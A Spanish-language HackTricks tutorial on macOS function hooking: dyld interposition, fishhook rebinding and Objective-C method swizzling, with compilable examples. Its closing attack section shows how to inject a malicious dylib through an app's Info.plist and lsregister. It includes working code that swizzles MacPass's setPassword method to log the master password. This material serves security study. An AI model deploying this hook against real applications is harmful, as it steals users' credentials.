# Hooking de funciones en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Interposición de funciones

Crea una **dylib** con una sección **`__interpose` (`__DATA___interpose`)** (o una sección marcada con **`S_INTERPOSING`**) que contenga tuplas de **punteros a funciones** que hagan referencia a las funciones **originales** y de **reemplazo**.

Después, **inyecta** la dylib con **`DYLD_INSERT_LIBRARIES`** (la interposición debe realizarse antes de que la aplicación principal se cargue). Obviamente, las [**restricciones** aplicadas al uso de **`DYLD_INSERT_LIBRARIES`** también se aplican aquí](macos-library-injection/index.html#check-restrictions).

### Interponer printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> La variable de entorno **`DYLD_PRINT_INTERPOSING`** puede utilizarse para depurar la interposición e imprimirá el proceso de interposición.

Ten en cuenta también que la **interposición ocurre entre el proceso y las bibliotecas cargadas**; no funciona con la caché de bibliotecas compartidas.

### Interposición dinámica

Ahora también es posible interponer una función dinámicamente utilizando la función **`dyld_dynamic_interpose`**. Esto permite interponer una función **programáticamente durante el runtime**, en lugar de hacerlo únicamente desde el **principio**.

Solo es necesario indicar las **tuplas** de la **función que se reemplazará y la función de reemplazo**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Si ya tienes ejecución de código **dentro del proceso** y quieres hacer hook de una **función C importada** sin relanzar el target, una primitiva muy común es **symbol rebinding** (popularizada por **`fishhook`**).

En lugar de usar la sección **`__interpose`**, esta técnica recorre los metadatos de Mach-O (`__LINKEDIT` -> tabla de símbolos indirectos -> `__la_symbol_ptr` / `__nl_symbol_ptr`) y **sobrescribe el import slot** utilizado por la imagen actual. Esto resulta muy útil para hacer hook de funciones en un proceso **ya en ejecución** o para hacer hook de **una sola imagen** con `rebind_symbols_image`.<sup>[[2]](#references)</sup>

> [!TIP]
> Esto solo afecta a las llamadas que realmente pasan por un **import pointer**. Si la función objetivo se **llama directamente dentro de la misma imagen**, no existe ningún import slot que reescribir, por lo que esta técnica no detectará ese call site.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
En versiones recientes de macOS, muchos objetivos de rebinding ya no se encuentran en páginas **`__DATA`** escribibles. Los rebinders normalmente necesitan hacer que **`__DATA_CONST`** sea escribible temporalmente antes de parchear el puntero. Además, en Apple Silicon / **`arm64e`** debes esperar punteros autenticados e indirección adicional en **`__AUTH_CONST.__auth_got`**, por lo que un rebinder que solo examine las secciones clásicas de punteros de símbolos lazy/non-lazy puede no detectar algunos puntos de llamada.<sup>[[3]](#references)</sup>

> [!CAUTION]
> La ABI **`arm64e`** usa **Pointer Authentication (PAC)** para muchos punteros de funciones. Las escrituras ciegas de punteros que antes funcionaban en Intel pueden romper un punto de llamada en Apple Silicon. Al escribir tu propio rebinder o inline hooker, debes estar preparado para usar helpers de **`<ptrauth.h>`** como **`ptrauth_sign_unauthenticated`** o **`ptrauth_auth_and_resign`**, y realizar pruebas específicamente en objetivos **`arm64e`**.

Para obtener más detalles sobre **`__AUTH`**, **`__AUTH_CONST`** y **`__auth_got`**, consulta [esta página](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

En ObjectiveC, así es como se llama a un método: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Se necesitan el **objeto**, el **método** y los **params**. Cuando se llama a un método, se envía un **msg** mediante la función **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

El objeto es **`someObject`**, el método es **`@selector(method1p1:p2:)`** y los argumentos son **value1**, **value2**.

Siguiendo las estructuras de objetos, es posible llegar a un **array de métodos** donde se encuentran los **nombres** y los **punteros** al código de los métodos.<sup>[[1]](#references)</sup>

> [!CAUTION]
> Ten en cuenta que, como se accede a los métodos y las clases mediante sus nombres, esta información se almacena en el binario, por lo que es posible recuperarla con `otool -ov </path/bin>` o [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Acceso a los métodos raw

Es posible acceder a información de los métodos, como el nombre, el número de params o la dirección, como en el siguiente ejemplo:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling con method_exchangeImplementations

La función **`method_exchangeImplementations`** permite **cambiar la** **dirección** de la **implementación** **de una función por la de la otra**.

> [!CAUTION]
> Por lo tanto, cuando se llama a una función, lo que se **ejecuta es la otra**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> En este caso, si el **código de implementación del método legítimo** **verifica** el **nombre** del **método**, podría **detectar** este swizzling e impedir que se ejecute.
>
> La siguiente técnica no tiene esta restricción.

### Method Swizzling with method_setImplementation

El formato anterior es extraño porque estás cambiando la implementación de 2 métodos, haciendo que uno use la del otro. Mediante la función **`method_setImplementation`** puedes **cambiar** la **implementación** de un **método por la del otro**.

Recuerda simplemente **guardar la dirección de la implementación del método original** si vas a llamarlo desde la nueva implementación antes de sobrescribirla, porque después será mucho más complicado localizar esa dirección.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodología de ataque de Hooking

En esta página se analizaron diferentes formas de hacer hooking de funciones. Sin embargo, implicaban **ejecutar código dentro del proceso que se va a atacar**.

Para hacerlo, la técnica más sencilla es inyectar una [Dyld mediante variables de entorno o hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Sin embargo, supongo que esto también podría hacerse mediante [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

No obstante, ambas opciones están **limitadas** a binarios/procesos **sin protección**. Consulta cada técnica para conocer más detalles sobre sus limitaciones.

Sin embargo, un ataque de hooking de funciones es muy específico: un atacante lo hará para **robar información sensible desde dentro de un proceso** (de lo contrario, simplemente realizaría un ataque de process injection). Esta información sensible podría estar ubicada en Apps descargadas por el usuario, como MacPass.

Por lo tanto, el vector del atacante consistiría en encontrar una vulnerabilidad o eliminar la firma de la aplicación, inyectar la variable de entorno **`DYLD_INSERT_LIBRARIES`** mediante el Info.plist de la aplicación, añadiendo algo como:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
y luego **volver a registrar** la aplicación:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Añade en esa library el código de hooking para exfiltrar la información: contraseñas, mensajes...

> [!CAUTION]
> Ten en cuenta que, en versiones más recientes de macOS, si **eliminas la firma** del binario de la aplicación y este se había ejecutado anteriormente, macOS **ya no ejecutará la aplicación**.

#### Ejemplo de library
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referencias

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: A library that simplifies the process of dynamically rebinding symbols in Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
